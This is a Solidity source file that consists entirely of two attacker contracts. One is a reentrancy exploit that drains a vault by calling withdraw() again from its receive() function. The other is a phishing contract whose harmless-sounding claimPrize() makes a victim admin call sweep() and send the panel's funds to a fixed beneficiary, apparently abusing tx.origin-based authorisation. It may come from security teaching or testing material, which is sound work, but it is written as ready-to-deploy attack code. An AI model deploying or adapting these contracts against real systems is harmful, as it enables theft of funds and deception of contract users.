// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVault public immutable target;
    uint256 public attackAmount;

    constructor(address _target) {
        target = IVault(_target);
    }

    function attack() external payable {
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw();
        }
    }
}

interface IAdminPanel {
    function sweep(address payable to) external;
}

contract PhishingContract {
    IAdminPanel public immutable panel;
    address payable public immutable beneficiary;

    constructor(address _panel, address payable _beneficiary) {
        panel = IAdminPanel(_panel);
        beneficiary = _beneficiary;
    }

    function claimPrize() external {
        panel.sweep(beneficiary);
    }
}
